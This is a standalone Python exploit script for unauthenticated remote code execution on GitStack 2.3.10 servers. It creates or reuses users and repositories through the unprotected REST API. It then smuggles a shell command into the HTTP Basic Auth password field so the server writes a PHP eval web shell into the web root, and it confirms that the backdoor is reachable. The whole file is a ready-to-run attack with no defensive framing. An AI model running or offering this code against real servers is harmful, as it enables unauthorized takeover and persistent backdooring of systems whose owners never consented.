#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2018/3/29 14:07

import sys
import requests

from requests.auth import HTTPBasicAuth

try:
    url = sys.argv[1]
except IndexError:
    exit("Please input target url. eg: python GitStack_2.3.10_Unauthenticated_RCE.py http://192.168.211.130/")


def create_user(username, password):
    try:
        # Create user
        r = requests.post("{}/rest/user/".format(url), data={'username': username, 'password': password})
        if "User created" not in r.text:
            exit("Cannot create user")

        print("Create user: {}".format(username))
        return username
    except Exception as msg:
        exit(msg)


def create_repository(name):
    try:
        # Create repository
        r = requests.post("{}/rest/repository/".format(url), cookies={'csrftoken': "token"},
                          data={'name': name, 'csrfmiddlewaretoken': "token"})
        if "successfully created" not in r.text:
            exit("Cannot create repository")

        print("Create repository: {}".format(name))
        return name
    except Exception as msg:
        exit(msg)


try:
    # Check user
    users = requests.get("{}/rest/user/".format(url)).json()
    users.remove("everyone")
    if len(users) > 0:
        print("Found user:{}".format(users))
        user = users[0]
    else:
        user = create_user("blablabla", "blablabla")

    # Check repository
    response = requests.get("{}/rest/repository/".format(url))
    reps = response.json()
    if reps:
        repository = reps[0]['name']
        print("Found repository: {}".format(repository))
    else:
        repository = create_repository("blablabla")

    # Check permissions
    response = requests.get("{}/rest/repository/{}".format(url, repository))
    users = response.json()
    if len(users["user_write_list"]) > 0:
        user = users["user_write_list"][0]["username"]
        print("Repository user:{}".format(users["user_write_list"]))
    else:
        # Add user to repository
        r = requests.post("{}/rest/repository/{}/user/{}/".format(url, repository, user))

        # Check add user to repository
        stats = requests.get("{}/rest/repository/{}/user/{}/".format(url, repository, user))
        if "true" in stats.text:
            print("Add user {} to repository success!".format(user))
        else:
            exit("Failed add user to repository...")

    # Login & Insert webshell
    exp = "p && echo ^<?php @eval($_POST['pass']) ?^> > c:\GitStack\gitphp\gitest.php"
    req = requests.get('{}/web/index.php?p={}.git&a=summary'.format(url, repository), auth=HTTPBasicAuth(user, exp))

    # Check webshell exist
    status_code = requests.get("{}/web/gitest.php".format(url)).status_code
    if status_code == 200:
        print("Insert webshell success! url: {}".format(url + "web/gitest.php"))
    else:
        exit("Insert Failed...")

except Exception as msg:
    exit(msg)
